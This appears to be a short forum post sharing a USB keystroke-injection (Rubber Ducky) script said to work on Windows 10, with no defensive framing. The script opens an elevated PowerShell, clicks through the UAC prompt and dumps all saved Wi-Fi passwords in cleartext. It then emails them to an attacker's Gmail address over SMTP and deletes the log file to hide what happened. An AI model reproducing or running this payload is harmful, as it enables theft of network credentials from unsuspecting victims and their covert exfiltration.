This works on Windows 10:

```DELAY 2000
REM --> Minimize all windows
WINDOWS d
REM --> Open cmd
WINDOWS r
DELAY 2000
STRING powershell
DELAY 500
ENTER
DELAY 8000
STRING Start-Process powershell -verb runAs
DELAY 200
ENTER
DELAY 3000
ALT y
DELAY 2000
STRING cd "C:\users\$env:USERNAME\"
DELAY 200
ENTER
DELAY 1000
STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %
DELAY 100
STRING {(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.M
DELAY 200
STRING atches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Fo
DELAY 200
STRING rmat-Table -AutoSize >"Log.txt" 
DELAY 200
ENTER
DELAY 1200
STRING $SMTPServer = 'smtp.gmail.com'
ENTER
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
STRING $SMTPInfo.EnableSSL = $true
ENTER
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('youremail@gmail.com', 'yourpassword')
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
ENTER
STRING $ReportEmail.From = 'youremail@gmail.com'
ENTER
STRING $ReportEmail.To.Add('youremail@anywhere.com')
ENTER
STRING $ReportEmail.Subject = 'WiFi key grabber'
ENTER
STRING $ReportEmail.Body = (Get-Content Log.txt | out-string)
ENTER
STRING $SMTPInfo.Send($ReportEmail)
ENTER
DELAY 8000
REM --> Delete Log.txt and exit
STRING del Log.txt
DELAY 200
ENTER
DELAY 200
STRING exit
DELAY 200
ENTER 
DELAY 300
STRING exit
DELAY 200
ENTER
```
